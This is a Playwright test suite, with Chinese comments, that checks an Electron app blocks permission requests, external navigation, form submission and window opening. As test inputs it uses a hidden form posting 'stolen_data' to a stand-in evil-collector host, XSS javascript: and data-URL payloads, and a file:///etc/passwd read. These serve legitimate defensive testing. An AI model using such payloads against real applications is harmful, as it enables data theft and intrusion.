/**
 * Electron安全红线测试 - 三大核心拦截验证
 * 基于ADR-0002安全基线，验证权限请求、外部导航、窗口打开的强制拦截
 *
 * 测试目标：确保Electron应用在任何情况下都能阻止这三类危险操作
 * 创建时间: 2025-08-30
 * 优先级: critical
 */

import { test, expect } from '@playwright/test';
import { launchApp } from '../../../helpers/launch';
import { ElectronApplication, Page } from '@playwright/test';

let electronApp: ElectronApplication;
let mainWindow: Page;

test.beforeAll(async () => {
  console.log('[RedLine] 启动Electron应用进行红线安全测试...');

  // 使用统一启动器（cifix1.txt要求）
  const { app, page } = await launchApp();
  electronApp = app;
  mainWindow = page;

  // 使用更健壮的等待策略
  await mainWindow.waitForFunction(
    () => ['interactive', 'complete'].includes(document.readyState),
    { timeout: 15000 }
  );

  // 确保页面不是chrome-error://
  const url = mainWindow.url();
  expect(url.startsWith('chrome-error://')).toBeFalsy();

  console.log(`[RedLine] Electron应用启动完成，页面: ${url}`);
});

test.afterAll(async () => {
  await electronApp?.close();
  console.log('\n🔴 === 安全红线测试完成 ===');
  console.log('✅ 权限请求拦截验证完成');
  console.log('✅ 外部导航拦截验证完成');
  console.log('✅ 窗口打开拦截验证完成');
  console.log('🛡️ 三大安全红线全部通过！');
});

test.describe('🔴 Electron安全红线测试 - ADR-0002核心拦截', () => {
  test.describe('红线1: 权限请求拦截 (默认拒绝)', () => {
    test('地理位置权限应被默认拒绝', async () => {
      console.log('[RedLine] 测试地理位置权限拦截...');

      const geolocationResult = await mainWindow.evaluate(async () => {
        return new Promise(resolve => {
          if (!navigator.geolocation) {
            resolve({ blocked: true, reason: 'geolocation_unavailable' });
            return;
          }

          const timeoutId = setTimeout(() => {
            resolve({ blocked: true, reason: 'timeout' });
          }, 3000);

          navigator.geolocation.getCurrentPosition(
            position => {
              clearTimeout(timeoutId);
              resolve({
                blocked: false,
                reason: 'permission_granted',
                hasPosition: !!position,
              });
            },
            error => {
              clearTimeout(timeoutId);
              resolve({
                blocked: true,
                reason: 'permission_denied',
                error: error.code,
              });
            },
            { timeout: 2000 }
          );
        });
      });

      // 验证地理位置权限被拒绝
      expect(geolocationResult.blocked).toBe(true);
      console.log(
        `[RedLine] ✅ 地理位置权限被拒绝: ${geolocationResult.reason}`
      );
    });

    test('摄像头权限应被默认拒绝', async () => {
      console.log('[RedLine] 测试摄像头权限拦截...');

      const cameraResult = await mainWindow.evaluate(async () => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          return { blocked: true, reason: 'getUserMedia_unavailable' };
        }

        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: true,
            audio: false,
          });

          if (stream) {
            stream.getTracks().forEach(track => track.stop());
            return { blocked: false, reason: 'permission_granted' };
          }

          return { blocked: true, reason: 'no_stream' };
        } catch (error: any) {
          return {
            blocked: true,
            reason: 'permission_denied',
            error: error.name,
          };
        }
      });

      // 验证摄像头权限被拒绝
      expect(cameraResult.blocked).toBe(true);
      console.log(`[RedLine] ✅ 摄像头权限被拒绝: ${cameraResult.reason}`);
    });

    test('麦克风权限应被默认拒绝', async () => {
      console.log('[RedLine] 测试麦克风权限拦截...');

      const microphoneResult = await mainWindow.evaluate(async () => {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
          return { blocked: true, reason: 'getUserMedia_unavailable' };
        }

        try {
          const stream = await navigator.mediaDevices.getUserMedia({
            video: false,
            audio: true,
          });

          if (stream) {
            stream.getTracks().forEach(track => track.stop());
            return { blocked: false, reason: 'permission_granted' };
          }

          return { blocked: true, reason: 'no_stream' };
        } catch (error: any) {
          return {
            blocked: true,
            reason: 'permission_denied',
            error: error.name,
          };
        }
      });

      // 验证麦克风权限被拒绝
      expect(microphoneResult.blocked).toBe(true);
      console.log(`[RedLine] ✅ 麦克风权限被拒绝: ${microphoneResult.reason}`);
    });

    test('通知权限应被控制', async () => {
      console.log('[RedLine] 测试通知权限拦截...');

      const notificationResult = await mainWindow.evaluate(async () => {
        if (!('Notification' in window)) {
          return { blocked: true, reason: 'notification_unavailable' };
        }

        const permission = Notification.permission;

        if (permission === 'granted') {
          return { blocked: false, reason: 'permission_already_granted' };
        }

        if (permission === 'denied') {
          return { blocked: true, reason: 'permission_denied' };
        }

        // 对于 'default' 状态，尝试请求权限
        try {
          const requestResult = await Notification.requestPermission();
          return {
            blocked: requestResult !== 'granted',
            reason: `request_result_${requestResult}`,
          };
        } catch (error: any) {
          return {
            blocked: true,
            reason: 'request_failed',
            error: error.message,
          };
        }
      });

      // 验证通知权限被适当控制（不能随意授权）
      expect(notificationResult.blocked).toBe(true);
      console.log(`[RedLine] ✅ 通知权限被控制: ${notificationResult.reason}`);
    });
  });

  test.describe('红线2: 外部导航拦截 (强制阻断)', () => {
    test('window.location.href外部导航应被阻止', async () => {
      console.log('[RedLine] 测试window.location.href外部导航拦截...');

      const originalUrl = mainWindow.url();
      console.log(`[RedLine] 原始URL: ${originalUrl}`);

      const navigationResult = await mainWindow.evaluate(() => {
        const originalHref = window.location.href;

        try {
          // 尝试导航到恶意外部站点
          window.location.href = 'https://malicious-external-site.com/attack';
          return {
            attempted: true,
            originalHref,
            newHref: window.location.href,
            blocked: window.location.href === originalHref,
          };
        } catch (error: any) {
          return {
            attempted: true,
            blocked: true,
            error: error.message,
            originalHref,
            newHref: window.location.href,
          };
        }
      });

      // 等待确保没有实际导航
      await new Promise(resolve => setTimeout(resolve, 2000));

      const currentUrl = mainWindow.url();

      // 验证外部导航被阻止
      expect(currentUrl).toBe(originalUrl);
      expect(currentUrl).not.toContain('malicious-external-site.com');
      expect(navigationResult.blocked).toBe(true);

      console.log(`[RedLine] ✅ 外部导航被阻止，当前URL: ${currentUrl}`);
    });

    test('window.open外部导航应被阻止', async () => {
      console.log('[RedLine] 测试window.open外部导航拦截...');

      const openResult = await mainWindow.evaluate(() => {
        const results = [];

        // 测试多种恶意外部链接
        const maliciousUrls = [
          'https://evil-site.com',
          'http://malicious-domain.net/attack',
          'https://phishing-site.org/steal-data',
          'javascript:alert("XSS")', // XSS 尝试
          'data:text/html,<script>alert("XSS")</script>', // Data URL XSS
        ];

        maliciousUrls.forEach(url => {
          try {
            const newWindow = window.open(url, '_blank');
            results.push({
              url,
              success: !!newWindow,
              blocked: !newWindow,
              windowObject: newWindow ? 'exists' : 'null',
            });

            // 如果窗口被创建，立即关闭
            if (newWindow) {
              newWindow.close();
            }
          } catch (error: any) {
            results.push({
              url,
              success: false,
              blocked: true,
              error: error.message,
            });
          }
        });

        return results;
      });

      // 验证所有恶意窗口打开都被阻止
      openResult.forEach(result => {
        expect(result.blocked).toBe(true);
        expect(result.success).toBe(false);
        console.log(`[RedLine] ✅ 阻止恶意窗口: ${result.url}`);
      });

      console.log(`[RedLine] ✅ 全部${openResult.length}个恶意窗口打开被阻止`);
    });

    test('表单外部提交应被阻止', async () => {
      console.log('[RedLine] 测试表单外部提交拦截...');

      const formSubmitResult = await mainWindow.evaluate(() => {
        try {
          // 创建恶意表单
          const form = document.createElement('form');
          form.method = 'POST';
          form.action = 'https://evil-collector.com/steal-data';
          form.target = '_blank';

          const input = document.createElement('input');
          input.type = 'hidden';
          input.name = 'stolen_data';
          input.value = 'sensitive_information';
          form.appendChild(input);

          document.body.appendChild(form);

          // 尝试提交表单
          form.submit();

          return {
            attempted: true,
            formCreated: true,
            submitCalled: true,
          };
        } catch (error: any) {
          return {
            attempted: true,
            blocked: true,
            error: error.message,
          };
        }
      });

      // 等待确保没有实际提交
      await new Promise(resolve => setTimeout(resolve, 2000));

      // 验证表单提交没有导致导航（当前页面未改变）
      const currentUrl = mainWindow.url();
      expect(currentUrl).not.toContain('evil-collector.com');

      console.log('[RedLine] ✅ 表单外部提交被阻止');
    });
  });

  test.describe('红线3: 新窗口打开拦截 (零容忍)', () => {
    test('所有window.open调用都应被阻止', async () => {
      console.log('[RedLine] 测试所有window.open调用拦截...');

      const allOpenTests = await mainWindow.evaluate(() => {
        const testCases = [
          // 基础测试
          { url: 'about:blank', target: '_blank' },
          { url: '', target: '_blank' },

          // 恶意URL测试
          { url: 'https://malicious.com', target: '_blank' },
          { url: 'http://evil.net', target: '_self' },
          { url: 'https://phishing.org', target: '_parent' },
          { url: 'https://scam.biz', target: '_top' },

          // JavaScript协议测试
          { url: 'javascript:void(0)', target: '_blank' },
          { url: 'javascript:alert("blocked?")', target: '_blank' },

          // Data URL测试
          { url: 'data:text/html,<h1>Test</h1>', target: '_blank' },

          // 本地文件测试
          { url: 'file:///etc/passwd', target: '_blank' },
          { url: 'file://C:/Windows/System32/', target: '_blank' },
        ];

        return testCases.map(testCase => {
          try {
            const newWindow = window.open(testCase.url, testCase.target);

            const result = {
              ...testCase,
              success: !!newWindow,
              blocked: !newWindow,
              windowType: newWindow ? typeof newWindow : 'null',
            };

            // 立即关闭任何意外打开的窗口
            if (newWindow) {
              try {
                newWindow.close();
              } catch (e) {
                // 忽略关闭错误
              }
            }

            return result;
          } catch (error: any) {
            return {
              ...testCase,
              success: false,
              blocked: true,
              error: error.message,
            };
          }
        });
      });

      // 验证所有window.open调用都被阻止
      allOpenTests.forEach(test => {
        expect(test.blocked).toBe(true);
        expect(test.success).toBe(false);
        console.log(
          `[RedLine] ✅ 阻止窗口打开: ${test.url} (target: ${test.target})`
        );
      });

      const totalBlocked = allOpenTests.filter(test => test.blocked).length;
      console.log(
        `[RedLine] ✅ 全部${totalBlocked}/${allOpenTests.length}个窗口打开被阻止`
      );
    });

    test('弹窗事件监听验证', async () => {
      console.log('[RedLine] 测试弹窗事件监听拦截...');

      const popupEventResult = await mainWindow.evaluate(() => {
        let popupAttempted = false;
        let popupBlocked = false;

        // 监听弹窗阻止事件
        window.addEventListener('beforeunload', () => {
          popupAttempted = true;
        });

        // 尝试通过事件触发弹窗
        try {
          const button = document.createElement('button');
          button.onclick = () => {
            popupAttempted = true;
            const popup = window.open('https://evil.com', '_blank');
            popupBlocked = !popup;
          };

          document.body.appendChild(button);
          button.click();

          return {
            popupAttempted,
            popupBlocked,
            testCompleted: true,
          };
        } catch (error: any) {
          return {
            popupAttempted: true,
            popupBlocked: true,
            error: error.message,
          };
        }
      });

      // 验证弹窗被阻止
      expect(popupEventResult.popupBlocked).toBe(true);
      console.log('[RedLine] ✅ 事件触发的弹窗被阻止');
    });

    test('iframe弹窗尝试应被阻止', async () => {
      console.log('[RedLine] 测试iframe弹窗拦截...');

      const iframePopupResult = await mainWindow.evaluate(() => {
        try {
          // 创建iframe并尝试从中打开弹窗
          const iframe = document.createElement('iframe');
          iframe.src = 'about:blank';
          document.body.appendChild(iframe);

          return new Promise(resolve => {
            iframe.onload = () => {
              try {
                const iframeWindow = iframe.contentWindow;
                if (iframeWindow) {
                  const popup = iframeWindow.open(
                    'https://malicious.com',
                    '_blank'
                  );
                  resolve({
                    iframeCreated: true,
                    popupBlocked: !popup,
                    popupSuccess: !!popup,
                  });
                } else {
                  resolve({
                    iframeCreated: true,
                    popupBlocked: true,
                    reason: 'no_contentWindow',
                  });
                }
              } catch (error: any) {
                resolve({
                  iframeCreated: true,
                  popupBlocked: true,
                  error: error.message,
                });
              }
            };

            // 超时保护
            setTimeout(() => {
              resolve({
                iframeCreated: true,
                popupBlocked: true,
                reason: 'timeout',
              });
            }, 2000);
          });
        } catch (error: any) {
          return {
            iframeCreated: false,
            popupBlocked: true,
            error: error.message,
          };
        }
      });

      // 验证iframe弹窗被阻止
      expect(iframePopupResult.popupBlocked).toBe(true);
      expect(iframePopupResult.popupSuccess).not.toBe(true);

      console.log('[RedLine] ✅ iframe弹窗被阻止');
    });
  });

  test.describe('红线综合验证', () => {
    test('安全拦截功能不影响正常应用功能', async () => {
      console.log('[RedLine] 验证安全拦截不影响正常功能...');

      // 验证页面基本功能正常
      const basicFunctionality = await mainWindow.evaluate(() => {
        return {
          domReady: document.readyState === 'complete',
          canCreateElements: !!document.createElement('div'),
          canAddEventListeners: typeof document.addEventListener === 'function',
          hasConsole: typeof console !== 'undefined',
          hasWindow: typeof window !== 'undefined',
          hasDocument: typeof document !== 'undefined',
          canAccessElectronAPI: !!(window as any).electronAPI,
        };
      });

      // 验证基本功能都正常
      expect(basicFunctionality.domReady).toBe(true);
      expect(basicFunctionality.canCreateElements).toBe(true);
      expect(basicFunctionality.canAddEventListeners).toBe(true);
      expect(basicFunctionality.hasConsole).toBe(true);
      expect(basicFunctionality.hasWindow).toBe(true);
      expect(basicFunctionality.hasDocument).toBe(true);
      expect(basicFunctionality.canAccessElectronAPI).toBe(true);

      console.log('[RedLine] ✅ 正常应用功能验证通过');
    });

    test('红线拦截性能影响评估', async () => {
      console.log('[RedLine] 评估安全拦截对性能的影响...');

      const performanceTest = await mainWindow.evaluate(() => {
        const startTime = performance.now();

        // 执行100次被拦截的操作测试性能
        for (let i = 0; i < 100; i++) {
          try {
            window.open(`https://test${i}.com`, '_blank');
          } catch (e) {
            // 忽略拦截错误
          }
        }

        const endTime = performance.now();
        const duration = endTime - startTime;

        return {
          iterations: 100,
          totalTime: duration,
          averageTime: duration / 100,
          acceptablePerformance: duration < 1000, // 100次操作应在1秒内完成
        };
      });

      // 验证性能影响在可接受范围内
      expect(performanceTest.acceptablePerformance).toBe(true);
      expect(performanceTest.averageTime).toBeLessThan(10); // 每次拦截平均不超过10ms

      console.log(
        `[RedLine] ✅ 性能影响测试: ${performanceTest.totalTime.toFixed(2)}ms / ${performanceTest.iterations}次`
      );
      console.log(
        `[RedLine] ✅ 平均拦截时间: ${performanceTest.averageTime.toFixed(2)}ms`
      );
    });

    test('红线配置完整性检查', async () => {
      console.log('[RedLine] 执行红线配置完整性检查...');

      // 通过主进程检查安全配置
      const configCheck = await electronApp.evaluate(async ({ app }) => {
        const windows = app.getAllWindows();
        if (windows.length === 0) return null;

        const mainWindow = windows[0];
        const webPreferences = mainWindow.webContents.getWebPreferences();

        const securityChecks = {
          nodeIntegrationDisabled: !webPreferences.nodeIntegration,
          contextIsolationEnabled: webPreferences.contextIsolation,
          sandboxEnabled: webPreferences.sandbox,
          webSecurityEnabled: webPreferences.webSecurity,
          allowRunningInsecureContentDisabled:
            !webPreferences.allowRunningInsecureContent,
          experimentalFeaturesDisabled: !webPreferences.experimentalFeatures,
        };

        const allChecks = Object.values(securityChecks);
        const passedChecks = allChecks.filter(check => check).length;
        const totalChecks = allChecks.length;

        return {
          ...securityChecks,
          score: (passedChecks / totalChecks) * 100,
          allPassed: passedChecks === totalChecks,
          summary: `${passedChecks}/${totalChecks} checks passed`,
        };
      });

      // 验证所有安全配置都正确
      expect(configCheck).not.toBeNull();
      expect(configCheck.allPassed).toBe(true);
      expect(configCheck.score).toBe(100);

      console.log(`[RedLine] ✅ 安全配置评分: ${configCheck.score}%`);
      console.log(`[RedLine] ✅ 配置检查: ${configCheck.summary}`);
    });
  });
});
